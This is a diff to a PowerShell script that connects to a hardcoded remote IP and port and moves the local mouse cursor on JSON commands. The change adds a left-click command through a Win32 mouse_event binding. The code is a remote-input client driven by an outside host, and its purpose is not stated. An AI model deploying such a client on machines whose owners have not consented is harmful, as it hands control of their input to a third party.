@@ -2,7 +2,7 @@ $daip = "84.213.241.114";
 $daport = 87;
 $enc = [Text.Encoding]::UTF8
 Add-Type -AssemblyName System.Windows.Forms
-
+$SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventNew" -namespace Win32Functions -passThru
 while ($True) {
     while ($True) {
         try {
@@ -44,6 +44,11 @@ while ($True) {
                     $POSITION.x -= $move;
                     [Windows.Forms.Cursor]::Position = $POSITION;
                 }
+                if ($json_data.move -eq "L_CLICK") {
+                    $SendMouseClick::mouse_event(0x00000002, 0, 0, 0, 0);
+                    $SendMouseClick::mouse_event(0x00000004, 0, 0, 0, 0);
+                }
+                
             }
             $bytesend = $enc.GetBytes("OK");
             $stream.Write($bytesend, 0, $bytesend.Length);
